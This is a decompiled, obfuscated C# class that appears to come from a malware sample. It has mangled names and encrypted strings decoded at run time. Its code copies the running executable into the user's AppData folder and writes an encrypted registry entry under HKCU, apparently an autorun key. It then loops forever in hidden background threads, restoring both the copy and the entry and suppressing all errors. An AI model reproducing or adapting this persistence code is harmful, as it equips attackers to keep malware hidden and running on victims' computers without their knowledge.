using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns0;

namespace ns1;

internal sealed class Class39
{
	public class Class40
	{
		private string string_0;

		private string string_1;

		public Class40()
		{
			string_0 = Class9.smethod_0("hsnU08qkerrcwqDOyt4L", "False");
			string_1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class9.smethod_0("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False");
		}

		public void method_0()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class9.smethod_0("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), writable: true);
				registryKey.SetValue(string_0, string_1);
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public void method_1()
		{
			try
			{
				string text = null;
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class9.smethod_0("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), writable: true);
				string[] valueNames = registryKey.GetValueNames();
				registryKey.Close();
				string[] array = valueNames;
				foreach (string text2 in array)
				{
					text = text + text2 + "\r\n";
				}
				if (!text.Contains(string_0))
				{
					Thread thread = new Thread((ThreadStart)delegate
					{
						method_0();
					});
					Control.set_CheckForIllegalCrossThreadCalls(false);
					thread.IsBackground = true;
					thread.Start();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public void method_2()
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				method_3();
			});
			thread.IsBackground = true;
			Control.set_CheckForIllegalCrossThreadCalls(false);
			thread.Start();
		}

		public void method_3()
		{
			while (true)
			{
				try
				{
					try
					{
						if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class9.smethod_0("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False")))
						{
							File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class9.smethod_0("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False"), overwrite: true);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						method_1();
					});
					thread.IsBackground = true;
					Control.set_CheckForIllegalCrossThreadCalls(false);
					thread.Start();
					MainForm mainForm = Class1.smethod_2().method_0();
					double double_ = 15.0;
					mainForm.method_5(ref double_);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}

		[SpecialName]
		[CompilerGenerated]
		private void method_4()
		{
			method_0();
		}

		[SpecialName]
		[CompilerGenerated]
		private void method_5()
		{
			method_3();
		}

		[SpecialName]
		[CompilerGenerated]
		private void method_6()
		{
			method_1();
		}
	}
}
